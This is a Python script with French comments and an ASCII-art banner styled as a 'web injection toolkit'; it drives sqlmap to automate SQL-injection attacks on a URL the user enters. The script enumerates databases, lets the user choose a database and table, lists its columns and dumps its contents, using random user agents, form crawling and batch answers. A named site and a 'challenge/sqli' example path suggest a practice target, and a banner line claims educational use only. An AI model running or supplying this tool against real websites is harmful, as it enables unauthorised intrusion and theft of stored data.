import subprocess
import os
import re
from datetime import datetime
import time

# ==========================================
# Auteur : ingenius
# Projet : Exploitation SQLmap & Analyse DB
# Date   : 20 Avril 2025
# Description : Script d'extraction & sélection de tables SQL
# ==========================================

print(r"""
██╗      █████╗ ███╗   ███╗██████╗ ██╗██████╗ ██╗
██║     ██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██║
██║     ███████║██╔████╔██║██████╔╝██║██████╔╝██║
██║     ██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔═══╝ ██║
███████╗██║  ██║██║ ╚═╝ ██║██║     ██║██║     ██║
╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝

       ⛧ WEB INJECTION TOOLKIT ⛧
        ✦ Scripté par Lamri ✦
   ⚠ Pour usage éducatif uniquement ⚠

   Target     : http://progfacil.fr
   Power      : Python3 + Regex + Sqlmap
""")

SQLMAP_OUTPUT_PATH = os.path.expanduser("~/.local/share/sqlmap/output")

def run_sqlmap_commands(base_url):
    timestamp = datetime.now().strftime("%H:%M:%S /%Y-%m-%d/")
    try:
        print(f"[+] Exécution : sqlmap -u {base_url} --random-agent --dbs --forms --crawl=5 --threads=5 --batch --answers=follow=y")
        print(base_url)
        dbs_output = subprocess.check_output([
            "sqlmap", "--random-agent", "-u", base_url,
            "--dbs", "--forms", "--crawl=1", "--threads=5",
            "--batch", "--answers=follow=y"
        ]).decode()
        databases = re.findall(r"\[\*\] (\w+)", dbs_output)

        
        print("Bases de données trouvées :")
        for i, db in enumerate(databases, start=0):
            print(f"{i}. {db}")
        position = int(input("Afficher la base de données après la position numéro : "))

        # Vérifie qu'on ne dépasse pas la taille de la liste
        if position < len(databases):
            print(f"La base de données après la {position}e est : {databases[position]}")
            db=databases[position]
        else:
            print("Il n'y a pas de base de données après cette position.")
            exit(1)
        
        print(f"[*] DB séléctionnée : {databases[position]}")
        print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} --tables --forms --crawl=5 --threads=5 --batch --answers=follow=y")
        tables_output = subprocess.check_output([
            "sqlmap", "--random-agent", "-u", base_url, "-D", db,
            "--tables", "--forms", "--crawl=1", "--threads=5",
            "--batch", "--answers=follow=y"
        ]).decode()

        tables = re.findall(r"\|\s*(\w+)\s*\|", tables_output)

        print("Les tables trouvées :")
        for i, table in enumerate(tables, start=0):
            print(f"{i}. {table}")

        choix = int(input("Entrez le numéro de la table que vous voulez sélectionner : "))

        print(f"✅ Vous avez sélectionné la table : {tables[choix]}")
        table=tables[choix]        

        try:
            columns_output = subprocess.check_output([
                "sqlmap", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                "--columns", "--forms", "--crawl=1", "--threads=5",
                "--batch", "--answers=follow=y"
            ]).decode()
            if "\n|" not in columns_output:
                print(f"[-] Aucune colonne trouvée dans la table {table}")
            print(f"[+] Colonnes trouvées dans {table}")
            print(f"[+] Exécution : sqlmap -u {base_url} --random-agent -D {db} -T {table} --dump --forms --crawl=5 --threads=5 --batch --answers=follow=y")
            subprocess.run([
                "sqlmap", "--random-agent", "-u", base_url, "-D", db, "-T", table,
                "--dump", "--forms", "--crawl=1", "--threads=5",
                "--batch", "--answers=follow=y"
            ])
        except subprocess.CalledProcessError:
            print(f"[-] Échec colonne ou dump pour {table} @ {timestamp}")
    except subprocess.CalledProcessError as e:
        print("[-] Erreur lors de l'exécution SQLMAP")
        print(e.output.decode())
        exit(1)

def main():
    url = input("Entrez l'URL complète (ex: http://progfacil.fr/images/challenge/sqli/) : ").strip()
    run_sqlmap_commands(url)

if __name__ == "__main__":
    main()
